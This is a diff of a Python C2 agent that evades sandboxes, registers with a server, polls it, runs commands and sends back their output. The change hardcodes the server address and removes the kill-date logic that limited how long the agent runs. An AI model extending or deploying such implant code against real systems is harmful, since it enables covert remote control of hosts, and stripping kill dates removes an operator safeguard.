@@ -43,7 +43,7 @@ def agent_arguments():
     parser.add_argument("-v", "--verbose", help="Increase Agent verbosity.", action="store_true")
     args = parser.parse_args()
 
-    SERVER_IP = args.server
+    SERVER_IP = 'localhost'
     INTERVAL = args.interval
 
     if SERVER_IP is None:
@@ -55,64 +55,6 @@ def agent_arguments():
     if args.verbose:
         VERBOSE = True
         print("[+] Verbosity enabled")
-
-
-def config_file():
-    """
-    Stores the ID and kill date of the Agent in config.ini file.
-    :return:
-    """
-    config = configparser.ConfigParser()
-    global agent_id
-
-    # When operator sets a kill date, kill_date_string will not be 'None'
-    # None was converted to a string. Do not remove it.
-    if kill_date_string != 'None' and kill_date_string != '':
-
-        config.read('config.ini')
-        if 'kill_date' in config['AGENT']:
-
-            # Check if current kill date is different from the one stored so that we change it
-            if config['AGENT']['kill_date'] != kill_date_string:
-                if VERBOSE:
-                    print('[+] Received new kill date')
-                    print('[+] %s' % kill_date_string)
-
-                config['AGENT'] = {'id': agent_id,
-                                   'kill_date': kill_date_string}
-                with open('config.ini', 'w') as configfile:
-                    config.write(configfile)
-                    if VERBOSE:
-                        print('[+] Wrote new config.ini file')
-        else:
-            config['AGENT'] = {'id': agent_id,
-                               'kill_date': kill_date_string}
-            with open('config.ini', 'w') as configfile:
-                config.write(configfile)
-                if VERBOSE:
-                    print('[+] Wrote new config.ini file')
-
-    # First time to run
-    if not os.path.exists(path=THIS_DIR / 'config.ini'):
-        config['AGENT'] = {'id': agent_id}
-        with open('config.ini', 'w') as configfile:
-            config.write(configfile)
-            if VERBOSE:
-                print('[+] Wrote new config.ini file')
-
-    # Other runs
-    else:
-        config.read('config.ini')
-        if 'kill_date' in config['AGENT']:
-            if kill_date_string == 'None':
-                config['AGENT'] = {'id': agent_id}
-                with open('config.ini', 'w') as configfile:
-                    config.write(configfile)
-                    if VERBOSE:
-                        print('[+] Wrote new config.ini file')
-                    return
-
-            confirm_kill()
 
 
 def execute_command(command_issued):
@@ -355,27 +297,12 @@ if __name__ == '__main__':
         agent_arguments()
         sandbox_evasion()
         print('[+] Agent running')
-        # Agent obtaining ID and kill date if any.
-        if not os.path.exists(path=THIS_DIR / 'config.ini'):
-            agent_id = randrange(500)
-            register()
-        else:
-            if VERBOSE:
-                print('[+] File config.ini exists')
-            agent_config = configparser.ConfigParser()
-            agent_config.read('config.ini')
-            try:
-                agent_id = agent_config['AGENT']['id']
-                print('[+] Agent already registered')
-            except KeyError:
-                sys.exit('[+] Agent has no ID in config.ini\n[+] Agent Stopped!!')
-            try:
-                kill_date_string = agent_config['AGENT']['kill_date']
-            except KeyError:
-                pass
+
+        agent_id = randrange(500)
+        register()
+
         while True:
             time.sleep(INTERVAL)
             send_output()
-            config_file()
     except KeyboardInterrupt:
         sys.exit('[+] Agent stopped')
